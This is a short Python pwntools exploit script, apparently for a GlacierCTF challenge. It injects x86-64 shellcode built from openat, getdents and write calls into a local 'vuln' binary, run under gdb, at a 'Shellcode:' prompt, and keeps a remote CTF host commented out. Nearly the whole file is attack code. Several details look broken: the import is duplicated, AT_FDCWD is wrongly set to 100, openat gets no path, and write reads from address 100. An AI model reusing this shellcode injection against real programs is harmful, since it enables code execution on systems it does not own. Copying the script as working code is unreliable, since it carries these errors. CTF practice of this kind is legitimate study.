from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
context.update(arch='amd64')
elf = ELF('./vuln')
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/libc.so.6"}


from pwn import *

#p = remote('chall.glacierctf.com', 13383)
#p = process('./vuln')
p = gdb.debug('./vuln', '''
b *main
b *main+220''')

AT_FDCWD = 100



payload = b''
payload += asm(shellcraft.openat(AT_FDCWD))
payload += asm(shellcraft.getdents(3, 'rsp', 0x20))
payload += asm(shellcraft.write(1, AT_FDCWD, 0x20))

p.recvuntil('Shellcode:')

p.sendline(payload)
p.interactive()
